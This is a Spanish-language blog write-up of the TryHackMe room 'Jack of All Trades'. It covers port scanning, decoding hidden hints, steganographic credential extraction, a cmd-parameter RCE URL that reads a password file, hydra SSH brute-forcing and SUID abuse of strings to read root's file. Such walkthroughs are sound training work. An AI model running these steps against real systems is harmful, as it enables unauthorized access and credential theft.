@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    
+      <title>
+        Jack of All Trades - Write Up - Español ::
+        Lanfran02 - Blog — Hackeando tu forma de aprender.
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Link Nivel Creador     Aquí Fácil MuirlandOracle    Reconocimiento Como de costumbre, usando nmap obtenemos los puertos abiertos de la máquina.
+Pero obtenemos algo bastante inusual.
+╰─ lanfran@parrot ❯ map 10.10.22.246 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 14:32 CEST Nmap scan report for 10.10.22.246 Host is up (0.058s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open http Apache httpd 2."
+/>
+<meta
+  name="keywords"
+  content="CTF, Writeup, Hacking"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/es/posts/jack-of-all-trades/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/es/posts/jack-of-all-trades/cover.jpeg"/>
+<meta name="twitter:title" content="Jack of All Trades - Write Up - Español"/>
+<meta name="twitter:description" content="Máquina de nivel fácil en TryHackMe."/>
+
+
+
+<meta property="og:title" content="Jack of All Trades - Write Up - Español" />
+<meta property="og:description" content="Máquina de nivel fácil en TryHackMe." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/es/posts/jack-of-all-trades/" />
+<meta property="og:image" content="/es/posts/jack-of-all-trades/cover.jpeg"/>
+<meta property="article:published_time" content="2021-07-04T14:31:31+02:00" />
+<meta property="article:modified_time" content="2021-07-04T14:31:31+02:00" /><meta property="og:site_name" content="Lanfran02 - Blog" />
+
+
+
+ 
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-3T7DYCWC0W', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+ 
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-3T7DYCWC0W', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/es/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Lanfran02</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/es/about">Acerca de mí</a></li>
+        
+      
+        
+          <li><a href="/">English</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Write Ups
+            <span class="menu__sub-inner-more-trigger-icon"
+              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span
+            >
+          </li>
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/es/tags/hackthebox/">HTB</a></li>
+              
+            
+              
+                <li><a href="/es/tags/tryhackme/">THM</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/es/about">Acerca de mí</a></li>
+      
+    
+      
+        <li><a href="/">English</a></li>
+      
+    
+      
+        <li><a href="/es/tags/hackthebox/">HTB</a></li>
+      
+    
+      
+        <li><a href="/es/tags/tryhackme/">THM</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Jack of All Trades - Write Up - Español</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2021-07-04
+        </span>
+
+        
+          
+        
+      
+
+      
+        <span class="post-author"
+          >— Escrito por Lanfran02</span
+        >
+
+
+      
+        <span class="post-read-time"
+          >— 6 mins lectura</span
+        >
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="/tags/strings/">#strings</a>&nbsp;
+        
+          <a href="/tags/stego/">#stego</a>&nbsp;
+        
+          <a href="/tags/rce/">#RCE</a>&nbsp;
+        
+          <a href="/tags/steghide/">#steghide</a>&nbsp;
+        
+          <a href="/tags/tryhackme/">#TryHackMe</a>&nbsp;
+        
+      </span>
+    
+
+    
+      <figure class="post-cover">
+        
+          <img src="/es/posts/jack-of-all-trades/cover.jpeg" alt="Jack of All Trades - Write Up - Español" />
+        
+
+        
+      </figure>
+    
+
+    <div class="post-content">
+      
+        
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconocimiento">Reconocimiento</a></li>
+    <li><a href="#acceso-inicial---usuario">Acceso inicial - Usuario</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav></aside>
+        
+      
+      <table>
+<thead>
+<tr>
+<th>Link</th>
+<th>Nivel</th>
+<th>Creador</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://tryhackme.com/room/jackofalltrades">Aquí</a></td>
+<td>Fácil</td>
+<td><a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Como de costumbre, usando <code>nmap</code> obtenemos los puertos abiertos de la máquina.</p>
+<p>Pero obtenemos algo bastante inusual.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ map 10.10.22.246                                                                                               ─╯
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> lanfran: 
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-04 14:32 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.22.246
+Host is up <span style="color:#f92672">(</span>0.058s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  http    Apache httpd 2.4.10 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.10 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+|_http-title: Jack-of-all-trades!
+|_ssh-hostkey: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+80/tcp open  ssh     OpenSSH 6.7p1 Debian <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">1024</span> 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">2048</span> 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 60.85 seconds
+</code></pre></div><p>¡Conseguimos los puertos cambiados!
+El <code>puerto SSH es el 80</code>.
+Y el <code>puerto web es el 22</code>.</p>
+<p>¡Es una buena manera de pu&amp;$*!# a algunas personas despistadas!</p>
+<p>Analicemos el servidor web con <code>gobuster</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ curl http://10.10.22.246:22/                                                                                                                              ─╯
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Jack-of-all-trades!&lt;/title&gt;
+		&lt;link href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/style.css&#34;</span> rel<span style="color:#f92672">=</span>stylesheet type<span style="color:#f92672">=</span>text/css&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;img id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;header&#34;</span> src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/header.jpg&#34;</span> width<span style="color:#f92672">=</span>100%&gt;
+		&lt;h1&gt;Welcome to Jack-of-all-trades!&lt;/h1&gt;
+		&lt;main&gt;
+			&lt;p&gt;My name is Jack. I<span style="color:#e6db74">&#39;m a toymaker by trade but I can do a little of anything -- hence the name!&lt;br&gt;I specialise in making children&#39;</span>s toys <span style="color:#f92672">(</span>no relation to the big man in the red suit - promise!<span style="color:#f92672">)</span> but anything you want, feel free to get in contact and I<span style="color:#e6db74">&#39;ll see if I can help you out.&lt;/p&gt;
+</span><span style="color:#e6db74">			&lt;p&gt;My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that&#39;</span>s all behind me. I<span style="color:#e6db74">&#39;m invested in other pursuits now!&lt;/p&gt;
+</span><span style="color:#e6db74">			&lt;p&gt;Please bear with me; I&#39;</span>m old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don<span style="color:#960050;background-color:#1e0010">&#39;</span>t worry, I &lt;em&gt;always&lt;/em&gt; clear up after myself.&lt;/p&gt;
+			&lt;p&gt;I love dinosaurs. I have a &lt;em&gt;huge&lt;/em&gt; collection of models. Like this one:&lt;/p&gt;
+			&lt;img src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/stego.jpg&#34;</span>&gt;
+			&lt;p&gt;I make a lot of models myself, but I also <span style="color:#66d9ef">do</span> toys, like this one:&lt;/p&gt;
+			&lt;img src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/jackinthebox.jpg&#34;</span>&gt;
+			&lt;!--Note to self - If I ever get locked out I can get back in at /recovery.php! --&gt;
+			&lt;!--  UmVtZW1iZX<span style="color:#f92672">[</span>REDACTADO<span style="color:#f92672">]</span>Nzd29yZDogdT9XdEtTcmFxCg<span style="color:#f92672">==</span> --&gt;
+			&lt;p&gt;I hope you choose to employ me. I love making new friends!&lt;/p&gt;
+			&lt;p&gt;Hope to see you soon!&lt;/p&gt;
+			&lt;p id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;signature&#34;</span>&gt;Jack&lt;/p&gt;
+		&lt;/main&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>Tenemos buena información aquí:</p>
+<ul>
+<li>Obtenemos un texto codificado aquí.</li>
+<li>Encontramos un nuevo endpoint <code>recovery.php</code>.</li>
+</ul>
+<ol>
+<li>¡Necesitamos decodificar el texto, así que vamos a usar <a href="https://gchq.github.io/CyberChef/">cyberchef</a>!
+Para decodificarlo necesitamos usar <code>Base64</code></li>
+</ol>
+<p>Y recibimos un mensaje:
+<code>Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [REDACTADO]( ¡Recuerde desearle lo mejor a Johny Graves con su búsqueda de trabajo en cripto! ¡Sus sistemas de codificación son increíbles! También debes recordar tu contraseña: [REDACTADO])</code></p>
+<p>¡Bien! Tenemos una contraseña. Dejémoslo para más tarde.</p>
+<ol start="2">
+<li>Usando curl para navegar, obtenemos también un texto codificado oculto en el código fuente.</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ curl http://10.10.22.246:22/recovery.php                                                                                                                  ─╯
+		
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Recovery Page&lt;/title&gt;
+		&lt;style&gt;
+			body<span style="color:#f92672">{</span>
+				text-align: center;
+			<span style="color:#f92672">}</span>
+		&lt;/style&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;h1&gt;Hello Jack! Did you forget your machine password again?..&lt;/h1&gt;	
+		&lt;form action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/recovery.php&#34;</span> method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
+			&lt;label&gt;Username:&lt;/label&gt;&lt;br&gt;
+			&lt;input name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span>&gt;&lt;br&gt;
+			&lt;label&gt;Password:&lt;/label&gt;&lt;br&gt;
+			&lt;input name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pass&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span>&gt;&lt;br&gt;
+			&lt;input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt;
+		&lt;/form&gt;
+		&lt;!-- GQ2TOMRXME3TE<span style="color:#f92672">[</span>REDACTADO<span style="color:#f92672">]</span>TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ<span style="color:#f92672">=</span>  --&gt;
+		 
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>¡Usemos <a href="https://gchq.github.io/CyberChef/">cyberchef</a> nuevamente para decodificarlo!</p>
+<p>La ruta de decodificación es <code>Base32 -&gt; Hex -&gt; ROT13</code>.</p>
+<p>Y recibimos un mensaje:
+<code>Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S</code>(
+<code>Recuerde que las credenciales para el inicio de sesión de recuperación están ocultas en la página de inicio. Sé lo olvidadiza que eres, así que aquí tienes una pista: bit.ly/2TvYQ2S</code>)</p>
+<h2 id="acceso-inicial---usuario">Acceso inicial - Usuario</h2>
+<p>Navegando a ese enlace, obtenemos una página de Stegosaurio de Wikipedia. ¿Quizás el creador nos está diciendo que usemos esteganografía?</p>
+<p>¡Descarguemos todas las imágenes de la página web!</p>
+<p>Después, ejecute <code>steghide</code> con la contraseña del &ldquo;1er&rdquo; punto, obtenemos un nuevo archivo:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ steghide extract -sf header.jpg                                                                                                                                       ─╯
+Enter passphrase: u<span style="color:#f92672">[</span>REDACTADO<span style="color:#f92672">]</span>
+the file <span style="color:#e6db74">&#34;cms.creds&#34;</span> does already exist. overwrite ? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span> y
+wrote extracted data to <span style="color:#e6db74">&#34;cms.creds&#34;</span>.
+
+╰─ lanfran@parrot ❯ cat cms.creds                                                                                                                                                         ─╯
+Here you go Jack. Good thing you thought ahead!
+
+Username: jackinthebox
+Password: <span style="color:#f92672">[</span>REDACTADO<span style="color:#f92672">]</span>
+</code></pre></div><p>¡Woohooo! ¡Obtenemos la contraseña del usuario para <code>recovery.php</code>!</p>
+<p>Así que iniciemos sesión ahora. [Si recibe el error &ldquo;ERR_UNSAFE_PORT&rdquo; en su navegador, debe habilitar el puerto 22. Busco en Google una forma de solucionarlo, en Brave / Chrome debe pasar la bandera &ldquo;&ndash;explicitly-allowed-ports=22 &ldquo;]</p>
+<p>¡Estupendo! Incluso podemos aprovechar el parámetro <code>cmd</code> para hacer RCE.</p>
+<p>Después de buscar, encontramos un archivo con contraseñas.</p>
+<p><code>http://10.10.194.240:22/nnxhweOV/index.php?cmd=cat%20%20/home/jacks_password_list</code></p>
+<p>Descargue ese archivo y usémoslo, junto con <code>hydra</code> para forzar el SSH (recuerde que está en el puerto 80 :))</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ hydra -l jack -P pass.txt -s <span style="color:#ae81ff">80</span> ssh://10.10.22.246                                                                                                                    ─╯
+Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2021-07-04 15:01:15
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">25</span> login tries <span style="color:#f92672">(</span>l:1/p:25<span style="color:#f92672">)</span>, ~2 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.10.22.246:80/
+<span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.22.246   login: jack   password: <span style="color:#f92672">[</span>REDACTADO<span style="color:#f92672">]</span>
+<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">1</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> target did not resolve or could not be connected
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> target did not complete
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2021-07-04 15:01:19
+</code></pre></div><p>Genial, ahora tenemos la contraseña, así que vamos a SSH.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ ssh jack@10.10.22.246 -p <span style="color:#ae81ff">80</span>                                                                                                                                           ─╯
+jack@10.10.22.246<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+jack@jack-of-all-trades:~$ ls -la
+total <span style="color:#ae81ff">312</span>
+drwxr-x--- <span style="color:#ae81ff">3</span> jack jack   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> .
+drwxr-xr-x <span style="color:#ae81ff">3</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> ..
+lrwxrwxrwx <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">9</span> Feb <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> .bash_history -&gt; /dev/null
+-rw-r--r-- <span style="color:#ae81ff">1</span> jack jack    <span style="color:#ae81ff">220</span> Feb <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> .bash_logout
+-rw-r--r-- <span style="color:#ae81ff">1</span> jack jack   <span style="color:#ae81ff">3515</span> Feb <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> .bashrc
+drwx------ <span style="color:#ae81ff">2</span> jack jack   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> .gnupg
+-rw-r--r-- <span style="color:#ae81ff">1</span> jack jack    <span style="color:#ae81ff">675</span> Feb <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> .profile
+-rwxr-x--- <span style="color:#ae81ff">1</span> jack jack <span style="color:#ae81ff">293302</span> Feb <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2020</span> user.jpg
+jack@jack-of-all-trades:~$ 
+</code></pre></div><p>Vamos a usar &ldquo;cat&rdquo; para leer la flag del usua&hellip; La p***, es una imagen. Descargámoslo a nuestra máquina local y leamos/copiemos la bandera.
+<em>Recomiendo usar el lector de autoimagen del traductor de Google para copiar la bandera :)</em></p>
+<h2 id="root">Root</h2>
+<p>Al escanear la máquina, encontramos que el binario <code>strings</code> tiene el Sticky bit, por lo que podemos usarlo para leer el flag de root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jack@jack-of-all-trades:~$ ls -la /usr/bin/strings 
+-rwsr-x--- <span style="color:#ae81ff">1</span> root dev <span style="color:#ae81ff">27536</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2015</span> /usr/bin/strings
+jack@jack-of-all-trades:~$ /usr/bin/strings /root/root.txt
+ToDo:
+1.Get new penguin skin rug -- surely they won<span style="color:#960050;background-color:#1e0010">&#39;</span>t miss one or two of those blasted creatures?
+2.Make T-Rex model!
+3.Meet up with Johny <span style="color:#66d9ef">for</span> a pint or two
+4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
+5.Remember to finish that contract <span style="color:#66d9ef">for</span> Lisa.
+6.Delete this: securi-tay2020_<span style="color:#f92672">{[</span>REDACTADO<span style="color:#f92672">]}</span>
+</code></pre></div><p>¡Y hemos &ldquo;rooteado&rdquo; la máquina!</p>
+<p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Leer otros posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/es/posts/develpy/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Develpy - Write Up - Español</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/es/posts/library/">
+                  <span class="button__text">Library - Write Up - Español</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">Lanfran02</div>
+      
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-3T7DYCWC0W', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+  </body>
+</html>
